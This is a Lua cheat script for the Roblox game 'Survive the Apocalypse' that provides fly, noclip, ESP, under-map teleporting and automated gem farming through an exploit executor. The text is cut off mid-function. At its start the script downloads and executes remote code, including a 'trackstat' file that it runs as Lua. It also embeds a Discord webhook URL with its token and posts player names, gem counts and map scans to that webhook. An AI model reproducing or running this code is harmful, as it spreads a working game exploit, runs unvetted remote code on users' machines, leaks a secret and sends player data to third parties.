--- survive the apo
setfpscap(30)
if getgenv().__STA_LOADED then return end
getgenv().__STA_LOADED = true

_G.Settings = _G.Settings or {
    -- Main
    AutoPowerPlant = true,
    TPAutoPowerPlant = false,

    -- Lobby
    AutoStartMatch = true,

    -- Player
    Fly = true,
    NoClip = true,
    PulseNoClip = false,
    Speed = false,
    RainbowOutline = true,

    -- Visuals
    Fullbright = true,
    NoFog = true,
    PowerPlantESP = true,

    -- Misc
    DeleteMap = true,
    GemDisplay = true,
    Disable3DRender = false,
    RedeemCode = true,
    SignUpQuest = true,
    UnlockFog = true,
    LimitTimer = true,

    -- Settings
    WebhookURL = "https://discord.com/api/webhooks/1493223299742699692/AcQgBvpGt-ZjRpYlCuT5hq4UPfsmsu3yp2aDHdYgt1przqspS6B7wen1YRMcUFlS0xVh",
}

if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
loadstring(game:HttpGet("https://raw.githubusercontent.com/bonusking007/trackstatSTP/refs/heads/main/README.md"))()
wait(2)

-- Track player join time & auto-rejoin/leave
local _playerJoinTime = tick()

task.spawn(function()
    while true do
        task.wait(30)
        local elapsed = tick() - _playerJoinTime
        -- 20 min = kick out
        if elapsed > 1200 then
            pcall(function()
                game:GetService("Players").LocalPlayer:Kick("Session limit (20 min)")
            end)
            return
        end
        -- 5 min = rejoin
        if elapsed > 300 then
            pcall(function()
                local TeleportService = game:GetService("TeleportService")
                local plr = game:GetService("Players").LocalPlayer
                TeleportService:Teleport(game.PlaceId, plr)
            end)
            return
        end
    end
end)

-- Anti-AFK
local VirtualUser = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local Workspace = game:GetService("Workspace")

local Lighting = game:GetService("Lighting")

local StarterGui = game:GetService("StarterGui")

local UserInputService = game:GetService("UserInputService")


local LocalPlayer = Players.LocalPlayer


local function safeLoadUrl(url, retries)
    retries = retries or 3
    for i = 1, retries do
        local ok, result = pcall(function()
            return loadstring(game:HttpGet(url))()
        end)
        if ok and result then
            return result
        end
        warn("[STA] Failed to load " .. url .. " attempt " .. i)
        wait(2)
    end
    error("[STA] Could not load: " .. url)
end

local Fluent = safeLoadUrl("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua")
local SaveManager = safeLoadUrl("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua")
local InterfaceManager = safeLoadUrl("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua")


local Window = Fluent:CreateWindow({

    Title = "[UPD] 🧟 Survive the Apocalypse",

    SubTitle = "by WWHub",

    TabWidth = 160,

    Size = UDim2.fromOffset(580, 460),

    Acrylic = true,

    Theme = "Dark",

    MinimizeKey = Enum.KeyCode.LeftControl

})



local Tabs = {

    Main = Window:AddTab({ Title = "Main", Icon = "zap" }),

    Lobby = Window:AddTab({ Title = "Lobby", Icon = "play" }),

    Player = Window:AddTab({ Title = "Player", Icon = "user" }),

    Visuals = Window:AddTab({ Title = "Visuals", Icon = "eye" }),

    Misc = Window:AddTab({ Title = "Misc", Icon = "wrench" }),

    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })

}



local Options = Fluent.Options



local state = {

    powerPlantBusy = false,

    tpPowerPlantBusy = false,

    flyEnabled = false,

    speedEnabled = false,

    manualNoClipEnabled = false,

    pulseNoClipEnabled = false,

    pulseWindowNoClip = false,

    fullbrightEnabled = false,

    noFogEnabled = false

}



local originalLighting = {}

local originalFog = {}

local noClipConnection

local speedConnection

local flyConnection

local pulseNoClipThread

local underMapPlate

local powerPlantThread

local tpPowerPlantThread

local powerPlantESPEnabled = false

local powerPlantESPObjects = {}

local webhookURL = ""

local sessionStartTime = tick()

local totalGemsCollected = 0

local rainbowThread

local rainbowHighlight

local espRefreshThread



local function buildAvatar()
    local apiUrl = string.format(
        "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false",
        LocalPlayer.UserId
    )
    local ok, resp = pcall(function()
        return game:GetService("HttpService"):JSONDecode(game:HttpGet(apiUrl))
    end)
    if ok and resp and resp.data and resp.data[1] then
        local imgUrl = resp.data[1].imageUrl
        if imgUrl then return imgUrl end
    end
    return string.format(
        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
        LocalPlayer.UserId
    )
end

local cachedAvatarUrl = buildAvatar()

local function sendWebhook(gemCount, totalGems)

    if webhookURL == "" then return end

    local playerName = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local elapsed = tick() - sessionStartTime
    local hours = math.floor(elapsed / 3600)
    local mins = math.floor((elapsed % 3600) / 60)
    local secs = math.floor(elapsed % 60)
    local timeStr = string.format("%02d:%02d:%02d", hours, mins, secs)

    local data = {
        username = "WWHub",
        avatar_url = cachedAvatarUrl,
        embeds = {{
            title = "🧟 Survive the Apocalypse | Gem Collected",
            color = 16766720,
            fields = {
                {name = "👤 Player", value = displayName .. " (@" .. playerName .. ")", inline = false},
                {name = "💎 Total Gems (Session)", value = tostring(totalGems), inline = false},
                {name = "💎 Gems This Round", value = tostring(gemCount), inline = false},
                {name = "⏱️ Time In Game", value = timeStr, inline = false},
            },
            thumbnail = {url = cachedAvatarUrl},
            footer = {text = "WWHub • Survive the Apocalypse"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}

    }



    local jsonData = game:GetService("HttpService"):JSONEncode(data)



    pcall(function()

        local req = (syn and syn.request) or (http and http.request) or http_request or request or fluxus and fluxus.request

        if req then

            req({

                Url = webhookURL,

                Method = "POST",

                Headers = {["Content-Type"] = "application/json"},

                Body = jsonData

            })

        end

    end)

end



local BASEPLATE_Y = -80

local PLAYER_UNDERGROUND_Y = -70

local TRAVEL_Y = -70

local FIRE_Y = -20

local MOVE_SPEED = 35

local TP_STEP = 3



local function notify(title, content, duration)

    Fluent:Notify({

        Title = title,

        Content = content,

        Duration = duration or 4

    })

end



local function getCharacter()

    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

end



local function getRoot()

    local character = getCharacter()

    return character:FindFirstChild("HumanoidRootPart")

end



local function getHumanoid()

    local character = getCharacter()

    return character:FindFirstChildOfClass("Humanoid")

end



local function getMapTiles()

    local map = Workspace:FindFirstChild("Map")

    return map and map:FindFirstChild("Tiles")

end



local function getGemCount()
    local gems = LocalPlayer:GetAttribute("Gems")
    if gems then return gems end
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    local mainUI = playerGui and playerGui:FindFirstChild("MainUI")
    local gemDisplay = mainUI and mainUI:FindFirstChild("GemDisplay")
    local countLabel = gemDisplay and gemDisplay:FindFirstChild("Count")
    if not countLabel then return nil end
    return tonumber(string.match(countLabel.Text or "", "%d+"))
end



local function createUnderMapPlate()

    if underMapPlate and underMapPlate.Parent then

        underMapPlate.Position = Vector3.new(0, BASEPLATE_Y, 0)

        return underMapPlate

    end



    local plate = Instance.new("Part")

    plate.Name = "STA_UnderMapPlate"

    plate.Anchored = true

    plate.CanCollide = true

    plate.Transparency = 0.75

    plate.Color = Color3.fromRGB(40, 40, 40)

    plate.Material = Enum.Material.SmoothPlastic

    plate.Size = Vector3.new(10000, 1, 10000)

    plate.Position = Vector3.new(0, BASEPLATE_Y, 0)

    plate.Parent = Workspace



    underMapPlate = plate

    return plate

end



local function forceUnderground()

    local root = getRoot()

    if not root then

        return false, "No HumanoidRootPart"

    end



    createUnderMapPlate()



    local startY = root.Position.Y

    local targetY = PLAYER_UNDERGROUND_Y

    local stepSize = 1.5

    local currentY = startY



    while currentY > targetY do

        root = getRoot()

        if not root then return false, "No HumanoidRootPart" end



        currentY = currentY - stepSize

        if currentY < targetY then

            currentY = targetY

        end



        root.CFrame = CFrame.new(root.Position.X, currentY, root.Position.Z)

        root.AssemblyLinearVelocity = Vector3.zero

        local hum = getHumanoid()

        if hum then

            hum:ChangeState(Enum.HumanoidStateType.Physics)

        end

        task.wait(0.03)

    end



    for _ = 1, 40 do

        root = getRoot()

        if not root then return false, "No HumanoidRootPart" end

        root.CFrame = CFrame.new(root.Position.X, targetY, root.Position.Z)

        root.AssemblyLinearVelocity = Vector3.zero

        local hum = getHumanoid()

        if hum then

            hum:ChangeState(Enum.HumanoidStateType.Physics)

        end

        task.wait(0.05)

    end



    return true

end



local function waitForStableUnderground()

    local root = getRoot()

    if not root then

        return false, "No HumanoidRootPart"

    end



    for _ = 1, 60 do

        root = getRoot()

        if not root then return false, "No HumanoidRootPart" end



        if math.abs(root.Position.Y - PLAYER_UNDERGROUND_Y) > 5 then

            local currentY = root.Position.Y

            while currentY > PLAYER_UNDERGROUND_Y do

                root = getRoot()

                if not root then return false, "No HumanoidRootPart" end

                currentY = currentY - 1.5

                if currentY < PLAYER_UNDERGROUND_Y then currentY = PLAYER_UNDERGROUND_Y end

                root.CFrame = CFrame.new(root.Position.X, currentY, root.Position.Z)

                root.AssemblyLinearVelocity = Vector3.zero

                task.wait(0.03)

            end

        end



        root.CFrame = CFrame.new(root.Position.X, PLAYER_UNDERGROUND_Y, root.Position.Z)

        root.AssemblyLinearVelocity = Vector3.zero

        local hum = getHumanoid()

        if hum then

            hum:ChangeState(Enum.HumanoidStateType.Physics)

        end

        task.wait(0.05)

    end



    return true

end



local function findProximityPrompt(model)

    for _, desc in ipairs(model:GetDescendants()) do

        if desc:IsA("ProximityPrompt") then

            return desc

        end

    end

    return nil

end



local function findAnchorPart(model)

    local prompt = findProximityPrompt(model)

    if prompt then

        local parent = prompt.Parent

        if parent and parent:IsA("BasePart") then

            return parent

        end

        if parent then

            local part = parent:FindFirstChildWhichIsA("BasePart", true)

            if part then

                return part

            end

        end

    end



    local doorpart1 = model:FindFirstChild("Doorpart1", true)
    if doorpart1 and doorpart1:IsA("BasePart") then
        return doorpart1
    end

    local powerBox = model:FindFirstChild("Power Box", true)

    if powerBox then

        local door = powerBox:FindFirstChild("Door")

        if door then

            local dp1 = door:FindFirstChild("Doorpart1")
            if dp1 and dp1:IsA("BasePart") then
                return dp1
            end

            if door:IsA("BasePart") then

                return door

            end

            local doorPart = door:FindFirstChildWhichIsA("BasePart", true)

            if doorPart then

                return doorPart

            end

        end

        local boxPart = powerBox:FindFirstChildWhichIsA("BasePart", true)

        if boxPart then

            return boxPart

        end

    end



    if model.PrimaryPart then

        return model.PrimaryPart

    end



    return model:FindFirstChildWhichIsA("BasePart", true)

end



local function isPowerPlantModel(model)

    if not model:IsA("Model") then

        return false

    end

    local name = model.Name:lower():gsub("%s+", "")

    return name == "powerplant" or name == "bigpowerplant"

end

local function findDoorPart(model)
    -- Try known path: model > Power Box > Door
    local powerBox = model:FindFirstChild("Power Box")
    if powerBox then
        local door = powerBox:FindFirstChild("Door")
        if door then
            -- Door might be a Model or BasePart
            if door:IsA("BasePart") then return door end
            local dp1 = door:FindFirstChild("Doorpart1")
            if dp1 and dp1:IsA("BasePart") then return dp1 end
            local bp = door:FindFirstChildWhichIsA("BasePart", true)
            if bp then return bp end
        end
    end
    -- Fallback: Doorpart1 anywhere
    local dp = model:FindFirstChild("Doorpart1", true)
    if dp and dp:IsA("BasePart") then return dp end
    -- Fallback: any BasePart
    return model:FindFirstChildWhichIsA("BasePart", true)
end

local function sendDebugLog(message)
    pcall(function()
        local wh = webhookURL
        if not wh or wh == "" then
            local cfg = _G.Settings
            wh = cfg and cfg.WebhookURL or ""
        end
        if wh == "" then return end
        local data = {
            content = "```\n" .. tostring(message) .. "\n```"
        }
        local jsonData = game:GetService("HttpService"):JSONEncode(data)
        local req = (syn and syn.request) or (http and http.request) or http_request or request or fluxus and fluxus.request
        if req then
            req({Url = wh, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
        end
    end)
end

local function debugScanTiles()
    local tiles = getMapTiles()
    if not tiles then
        sendDebugLog("[DEBUG] getMapTiles() returned nil!")
        return
    end
    local children = tiles:GetChildren()
    local log = "[DEBUG SCAN] Tiles children count: " .. #children .. "\n"
    local powerCount = 0
    local allNames = {}
    for _, child in pairs(children) do
        local name = child.Name
        local className = child.ClassName
        local hasPower = string.find(name, "Power") ~= nil
        local hasBig = string.find(name, "Big") ~= nil
        if hasPower then
            powerCount += 1
            local posStr = "NO POS"
            pcall(function()
                local cf = child:GetPivot()
                if cf then
                    local p = cf.Position
                    posStr = ("%.0f, %.0f, %.0f (pivot)"):format(p.X, p.Y, p.Z)
                end
            end)
            if posStr == "NO POS" then
                pcall(function()
                    if child.PrimaryPart then
                        local p = child.PrimaryPart.Position
                        posStr = ("%.0f, %.0f, %.0f"):format(p.X, p.Y, p.Z)
                    else
                        local part = child:FindFirstChildWhichIsA("BasePart", true)
                        if part then
                            local p = part.Position
                            posStr = ("%.0f, %.0f, %.0f (fallback)"):format(p.X, p.Y, p.Z)
                        end
                    end
                end)
            end
            log = log .. ("  [MATCH] %s | Class: %s | Big: %s | Pos: %s\n"):format(name, className, tostring(hasBig), posStr)
        else
            if not allNames[name] then
                allNames[name] = 0
            end
            allNames[name] += 1
        end
    end
    log = log .. "Power matches: " .. powerCount .. "\n"
    log = log .. "Other tile types:\n"
    for n, c in pairs(allNames) do
        log = log .. ("  %s x%d\n"):format(n, c)
    end
    sendDebugLog(log)
end

local function fastScanPlantModels()
    local tiles = getMapTiles()
    if not tiles then return {} end
    local results = {}
    for _, child in pairs(tiles:GetChildren()) do
        local name = child.Name
        if string.find(name, "Power") then
            local isBig = string.find(name, "Big") ~= nil
            local pos = nil
            pcall(function()
                -- GetPivot works even when parts aren't streamed
                local cf = child:GetPivot()
                if cf then pos = cf.Position end
            end)
            if not pos then
                pcall(function()
                    if child.PrimaryPart then
                        pos = child.PrimaryPart.Position
                    else
                        local part = child:FindFirstChildWhichIsA("BasePart", true)
                        if part then pos = part.Position end
                    end
                end)
            end
            table.insert(results, {
                model = child,
                approxPos = pos,
                isBig = isBig,
            })
        end
    end
    return results
end



local function requestStreamAround(position)
    pcall(function()
        LocalPlayer:RequestStreamAroundAsync(position, 5)
    end)
end

local function getUniquePowerPlantTiles()

    local tiles = getMapTiles()

    if not tiles then

        return {}

    end



    local found = {}

    local unique = {}



    for _, child in ipairs(tiles:GetChildren()) do

        if not found[child] and isPowerPlantModel(child) then

            local prompt = findProximityPrompt(child)

            local anchor = findAnchorPart(child)

            if prompt and anchor then

                found[child] = true

                table.insert(unique, {

                    model = child,

                    prompt = prompt,

                    doorPart = anchor,

                    isBig = child.Name:lower():find("big") ~= nil

                })

            end

        end

    end



    table.sort(unique, function(a, b)

        return a.model:GetDebugId() < b.model:GetDebugId()

    end)



    return unique

end

local function getUnloadedPlantModels()
    local tiles = getMapTiles()
    if not tiles then return {} end
    local unloaded = {}
    for _, child in ipairs(tiles:GetChildren()) do
        if isPowerPlantModel(child) then
            local prompt = findProximityPrompt(child)
            local anchor = findAnchorPart(child)
            if not prompt or not anchor then
                table.insert(unloaded, child)
            end
        end
    end
    return unloaded
end

local function getModelApproxPosition(model)
    if model.PrimaryPart then
        return model.PrimaryPart.Position
    end
    local part = model:FindFirstChildWhichIsA("BasePart", true)
    if part then
        return part.Position
    end
    return nil
end

local function scanForAllPlants(maxWait)
    maxWait = maxWait or 15
    local plants = getUniquePowerPlantTiles()
    if #plants >= 4 then return plants end

    local unloaded = getUnloadedPlantModels()
    if #unloaded > 0 then
        notify("Scan", ("Found %d unloaded plants, moving close to load..."):format(#unloaded), 3)

        for _, model in ipairs(unloaded) do
            local pos = getModelApproxPosition(model)
            if pos then
                requestStreamAround(pos)
                task.wait(1)

                local prompt = findProximityPrompt(model)
                if prompt then continue end

                local root = getRoot()
                if root then
                    local savedPos = root.CFrame
                    root.CFrame = CFrame.new(pos.X, TRAVEL_Y, pos.Z)
                    root.AssemblyLinearVelocity = Vector3.zero
                    task.wait(2)
                    requestStreamAround(pos)
                    task.wait(1)
                end
            else
                requestStreamAround(Vector3.new(0, 0, 0))
                task.wait(1)
            end
        end
    end

    local deadline = tick() + maxWait
    local bestCount = #plants
    while tick() < deadline do
        plants = getUniquePowerPlantTiles()
        if #plants > bestCount then
            bestCount = #plants
            notify("Scan", ("Plants found: %d"):format(bestCount), 3)
        end
        if bestCount >= 4 then break end

        local stillUnloaded = getUnloadedPlantModels()
        for _, model in ipairs(stillUnloaded) do
            local pos = getModelApproxPosition(model)
            if pos then
                requestStreamAround(pos)
            end
        end
        task.wait(1.5)
    end
    return getUniquePowerPlantTiles()
end



local function clearPowerPlantESP()

    for _, obj in ipairs(powerPlantESPObjects) do

        pcall(function()

            obj:Destroy()

        end)

    end

    table.clear(powerPlantESPObjects)

end



local function refreshPowerPlantESP()

    clearPowerPlantESP()

    if not powerPlantESPEnabled then

        return

    end



    local plants = getUniquePowerPlantTiles()

    for index, plantData in ipairs(plants) do

        local highlight = Instance.new("Highlight")

        highlight.Name = "STA_PowerPlantESP"

        highlight.Adornee = plantData.model

        highlight.FillColor = Color3.fromRGB(255, 215, 0)

        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)

        highlight.FillTransparency = 0.55

        highlight.OutlineTransparency = 0

        highlight.Parent = plantData.model

        table.insert(powerPlantESPObjects, highlight)



        local billboard = Instance.new("BillboardGui")

        billboard.Name = "STA_PowerPlantLabel"

        billboard.Size = UDim2.new(0, 180, 0, 40)

        billboard.AlwaysOnTop = true

        billboard.StudsOffset = Vector3.new(0, 8, 0)

        billboard.Adornee = plantData.doorPart

        billboard.Parent = plantData.model



        local label = Instance.new("TextLabel")

        label.BackgroundTransparency = 1

        label.Size = UDim2.fromScale(1, 1)

        label.Text = ("PowerPlant %d"):format(index)

        label.TextScaled = true

        label.TextColor3 = Color3.fromRGB(255, 230, 120)

        label.TextStrokeTransparency = 0

        label.Font = Enum.Font.GothamBold

        label.Parent = billboard



        table.insert(powerPlantESPObjects, billboard)

    end

end



local function startRainbowOutline()

    if rainbowThread then

        pcall(task.cancel, rainbowThread)

    end



    local character = getCharacter()

    if not character then return end



    for _, child in ipairs(character:GetDescendants()) do

        pcall(function()

            if child:IsA("Accessory") or child:IsA("Shirt") or child:IsA("Pants")

                or child:IsA("ShirtGraphic") or child:IsA("CharacterMesh") then

                child:Destroy()

            elseif child:IsA("BodyColors") then

                child.HeadColor3 = Color3.new(1, 1, 1)

                child.LeftArmColor3 = Color3.new(1, 1, 1)

                child.LeftLegColor3 = Color3.new(1, 1, 1)

                child.RightArmColor3 = Color3.new(1, 1, 1)

                child.RightLegColor3 = Color3.new(1, 1, 1)

                child.TorsoColor3 = Color3.new(1, 1, 1)

            elseif child:IsA("BasePart") then

                child.Color = Color3.new(1, 1, 1)

            elseif child:IsA("Decal") or child:IsA("Texture") then

                child.Transparency = 1

            end

        end)

    end



    if rainbowHighlight and rainbowHighlight.Parent then

        rainbowHighlight:Destroy()

    end



    rainbowHighlight = Instance.new("Highlight")

    rainbowHighlight.Name = "STA_RainbowOutline"

    rainbowHighlight.FillColor = Color3.new(1, 1, 1)

    rainbowHighlight.FillTransparency = 0.8

    rainbowHighlight.OutlineTransparency = 0

    rainbowHighlight.Parent = character



    rainbowThread = task.spawn(function()

        local hue = 0

        while rainbowHighlight and rainbowHighlight.Parent do

            hue = (hue + 0.01) % 1

            rainbowHighlight.OutlineColor = Color3.fromHSV(hue, 1, 1)

            task.wait(0.03)

        end

    end)

end



local function stopRainbowOutline()

    if rainbowThread then

        pcall(task.cancel, rainbowThread)

        rainbowThread = nil

    end

    if rainbowHighlight and rainbowHighlight.Parent then

        rainbowHighlight:Destroy()

        rainbowHighlight = nil

    end

end



local function startESPRefreshLoop()

    if espRefreshThread then

        pcall(task.cancel, espRefreshThread)

    end

    espRefreshThread = task.spawn(function()
        while powerPlantESPEnabled do
            local currentPlants = fastScanPlantModels()
            local existingModels = {}
            for _, obj in ipairs(powerPlantESPObjects) do
                if obj:IsA("Highlight") and obj.Adornee then
                    existingModels[obj.Adornee] = true
                end
            end

            local newIndex = #powerPlantESPObjects / 2
            for _, plantData in ipairs(currentPlants) do
                if not existingModels[plantData.model] then
                    newIndex += 1

                    -- Highlight just the Door/key part, not the whole model
                    local door = findDoorPart(plantData.model)
                    local highlightTarget = door or plantData.model

                    local highlight = Instance.new("Highlight")
                    highlight.Name = "STA_PowerPlantESP"
                    highlight.Adornee = highlightTarget
                    highlight.FillColor = plantData.isBig and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(255, 215, 0)
                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                    highlight.FillTransparency = 0.4
                    highlight.OutlineTransparency = 0
                    highlight.Parent = plantData.model
                    table.insert(powerPlantESPObjects, highlight)

                    -- Billboard at approxPos
                    local adornPart = door or plantData.model:FindFirstChildWhichIsA("BasePart", true)
                    if adornPart then
                        local billboard = Instance.new("BillboardGui")
                        billboard.Name = "STA_PowerPlantLabel"
                        billboard.Size = UDim2.new(0, 200, 0, 40)
                        billboard.AlwaysOnTop = true
                        billboard.StudsOffset = Vector3.new(0, 8, 0)
                        billboard.Adornee = adornPart
                        billboard.Parent = plantData.model

                        local label = Instance.new("TextLabel")
                        label.BackgroundTransparency = 1
                        label.Size = UDim2.fromScale(1, 1)
                        local tag = plantData.isBig and "Big" or ""
                        label.Text = ("%sPowerPlant %d"):format(tag, math.floor(newIndex))
                        label.TextScaled = true
                        label.TextColor3 = plantData.isBig and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(255, 230, 120)
                        label.TextStrokeTransparency = 0
                        label.Font = Enum.Font.GothamBold
                        label.Parent = billboard
                        table.insert(powerPlantESPObjects, billboard)
                    end
                end
            end

            task.wait(5)
        end
    end)

end



local function stopESPRefreshLoop()

    if espRefreshThread then

        pcall(task.cancel, espRefreshThread)

        espRefreshThread = nil

    end

end



local function isPlayerDead()
    local ok, dead = pcall(function()
        local hum = getHumanoid()
        if not hum then return true end
        return hum.Health <= 0
    end)
    if not ok then return true end
    return dead
end

local function waitForRespawn(timeout)
    timeout = timeout or 10
    local deadline = tick() + timeout
    while tick() < deadline do
        local hum = getHumanoid()
        if hum and hum.Health > 0 then return true end
        task.wait(0.5)
    end
    return false
end

local function walkToUndergroundTarget(targetPosition, speed, customY)

    local useY = customY or PLAYER_UNDERGROUND_Y

    local root = getRoot()

    if not root then

        return false, "No HumanoidRootPart"

    end



    local goalX = targetPosition.X

    local goalZ = targetPosition.Z

    local deadline = tick() + 30



    while tick() < deadline do

        if isPlayerDead() then
            return false, "Player died"
        end

        root = getRoot()

        if not root then

            return false, "Lost HumanoidRootPart"

        end



        root.CFrame = CFrame.new(root.Position.X, useY, root.Position.Z)

        root.AssemblyLinearVelocity = Vector3.zero



        local dx = goalX - root.Position.X

        local dz = goalZ - root.Position.Z

        local distance = math.sqrt(dx * dx + dz * dz)



        if distance <= 3 then

            return true

        end



        local dirX = dx / distance

        local dirZ = dz / distance

        local step = math.min(speed * 0.05, distance)



        root.CFrame = CFrame.new(root.Position.X + dirX * step, useY, root.Position.Z + dirZ * step)

        root.AssemblyLinearVelocity = Vector3.zero



        task.wait(0.05)

    end



    return false, "Walk timeout"

end



local function sortPlantsByNearest(plants)
    local root = getRoot()
    if not root then return plants end
    local playerPos = root.Position
    table.sort(plants, function(a, b)
        local distA = (a.doorPart.Position - playerPos).Magnitude
        local distB = (b.doorPart.Position - playerPos).Magnitude
        return distA < distB
    end)
    return plants
end

local function resetAndVoteRestart()
    pcall(function()
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.Health = 0
        end
    end)
    task.wait(1)
    pcall(function()
        local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 5)
        local misc = remotes and remotes:WaitForChild("Misc", 5)
        local vote = misc and misc:WaitForChild("VotePlayAgain", 5)
        if vote then
            vote:FireServer()
        end
    end)
end

local TP_STEP = 10
local TP_WAIT = 0.08

local function teleportStepToTarget(targetPosition, customY)
    local useY = customY or PLAYER_UNDERGROUND_Y
    local root = getRoot()
    if not root then return false, "No HumanoidRootPart" end

    local goalX = targetPosition.X
    local goalZ = targetPosition.Z
    local deadline = tick() + 30

    while tick() < deadline do
        if isPlayerDead() then
            return false, "Player died"
        end
        root = getRoot()
        if not root then return false, "Lost HumanoidRootPart" end

        local dx = goalX - root.Position.X
        local dz = goalZ - root.Position.Z
        local distance = math.sqrt(dx * dx + dz * dz)

        if distance <= 3 then
            root.CFrame = CFrame.new(goalX, useY, goalZ)
            root.AssemblyLinearVelocity = Vector3.zero
            return true
        end

        local dirX = dx / distance
        local dirZ = dz / distance
        local step = math.min(TP_STEP, distance)

        root.CFrame = CFrame.new(root.Position.X + dirX * step, useY, root.Position.Z + dirZ * step)
        root.AssemblyLinearVelocity = Vector3.zero
        task.wait(TP_WAIT)
    end

    return false, "TP walk timeout"
end

local function stopTPPowerPlant()
    state.tpPowerPlantBusy = false
    if tpPowerPlantThread then
        pcall(task.cancel, tpPowerPlantThread)
        tpPowerPlantThread = nil
    end
end

local function runTPPowerPlantSequence()
    if state.tpPowerPlantBusy then return end
    state.tpPowerPlantBusy = true

    tpPowerPlantThread = task.spawn(function()
        while state.tpPowerPlantBusy do
            local ok, err = pcall(function()
                local ROUND_TIMEOUT = 180
                local roundStartTime = tick()
                local function isRoundExpired()
                    return (tick() - roundStartTime) >= ROUND_TIMEOUT
                end

                notify("TP Power Plant", "Starting in 3 seconds...", 3)
                task.wait(3)
                if not state.tpPowerPlantBusy then return end

                notify("TP Power Plant", "Scanning for all plants...", 3)
                local plants = scanForAllPlants(10)
                if #plants == 0 then
                    notify("TP Power Plant", "No Power Plants found, waiting...", 4)
                    task.wait(3)
                    return
                end

                plants = sortPlantsByNearest(plants)

                local normalCount, bigCount = 0, 0
                for _, p in ipairs(plants) do
                    if p.isBig then bigCount += 1 else normalCount += 1 end
                end

                notify("TP Power Plant", ("Found %d plants (%d normal, %d big)"):format(#plants, normalCount, bigCount), 4)

                createUnderMapPlate()
                if not state.tpPowerPlantBusy then return end

                local undergroundOk, undergroundErr = forceUnderground()
                if not undergroundOk then
                    notify("TP Power Plant", "Underground failed: " .. tostring(undergroundErr), 4)
                    return
                end
                if not state.tpPowerPlantBusy then return end

                local stableOk, stableErr = waitForStableUnderground()
                if not stableOk then
                    notify("TP Power Plant", "Stabilize failed: " .. tostring(stableErr), 4)
                    return
                end

                local donePositions = {}
                local gemsThisRound = 0

                local function posKey(pos)
                    return math.floor(pos.X + 0.5) .. "_" .. math.floor(pos.Z + 0.5)
                end

                local function isPosDone(pos)
                    return donePositions[posKey(pos)] == true
                end

                local function markPosDone(pos)
                    donePositions[posKey(pos)] = true
                end

                local function fireAndCollect(pData, doorPos, label)
                    local startingGems = getGemCount() or 0
                    local gotGem = false
                    local fireOffsets = {
                        Vector3.new(0, 0, 0),
                        Vector3.new(2, 0, 0),
                        Vector3.new(-2, 0, 0),
                        Vector3.new(0, 0, 2),
                        Vector3.new(0, 0, -2),
                    }
                    local fireDeadline = tick() + 4
                    local offsetIdx = 1
                    while tick() < fireDeadline and state.tpPowerPlantBusy and not isRoundExpired() do
                        if isPlayerDead() then break end
                        local root = getRoot()
                        if not root then break end
                        local off = fireOffsets[offsetIdx]
                        root.CFrame = CFrame.new(doorPos.X + off.X, FIRE_Y, doorPos.Z + off.Z)
                        root.AssemblyLinearVelocity = Vector3.zero
                        pcall(function() fireproximityprompt(pData.prompt) end)
                        task.wait(0.15)
                        local currentGems = getGemCount() or 0
                        if currentGems > startingGems then
                            markPosDone(doorPos)
                            gotGem = true
                            gemsThisRound += 1
                            totalGemsCollected += 1
                            notify("TP Power Plant", ("Gem! %s (%d total)"):format(label, gemsThisRound), 3)
                            task.spawn(function() sendWebhook(currentGems, totalGemsCollected) end)
                            break
                        end
                        offsetIdx = (offsetIdx % #fireOffsets) + 1
                        task.wait(0.1)
                    end
                    if not gotGem then
                        markPosDone(doorPos)
                        notify("TP Power Plant", "No gem " .. label .. ", done", 3)
                    end
                    if state.tpPowerPlantBusy then
                        local root = getRoot()
                        if root then
                            root.CFrame = CFrame.new(root.Position.X, TRAVEL_Y, root.Position.Z)
                            root.AssemblyLinearVelocity = Vector3.zero
                        end
                        task.wait(0.3)
                    end
                    return gotGem
                end

                -- Split into normal and big
                local normalPlants, bigPlantModels = {}, {}
                for _, p in ipairs(plants) do
                    if p.isBig then table.insert(bigPlantModels, p)
                    else table.insert(normalPlants, p) end
                end

                -- Also find unloaded big plants from workspace
                local tiles = getMapTiles()
                if tiles then
                    local knownModels = {}
                    for _, p in ipairs(plants) do knownModels[p.model] = true end
                    for _, child in ipairs(tiles:GetChildren()) do
                        if not knownModels[child] and isPowerPlantModel(child) and child.Name:lower():find("big") then
                            table.insert(bigPlantModels, {
                                model = child,
                                prompt = nil,
                                doorPart = nil,
                                isBig = true,
                            })
                        end
                    end
                end

                -- === Phase 1: Farm normal plants with TP ===
                if #normalPlants > 0 then
                    notify("TP Power Plant", ("Phase 1: %d normal plants"):format(#normalPlants), 4)
                end

                for idx, plantData in ipairs(normalPlants) do
                    if not state.tpPowerPlantBusy then return end
                    if isRoundExpired() then break end
                    if not plantData.model or not plantData.model.Parent then continue end

                    local freshPrompt = findProximityPrompt(plantData.model)
                    if freshPrompt then plantData.prompt = freshPrompt end
                    local freshAnchor = findAnchorPart(plantData.model)
                    if freshAnchor then plantData.doorPart = freshAnchor end
                    if not plantData.prompt or not plantData.doorPart then continue end

                    local doorPos = plantData.doorPart.Position
                    if isPosDone(doorPos) then continue end

                    notify("TP Power Plant", ("Normal %d/%d"):format(idx, #normalPlants), 3)
                    local moveOk = teleportStepToTarget(doorPos, TRAVEL_Y)
                    if not moveOk then continue end
                    if not state.tpPowerPlantBusy then return end
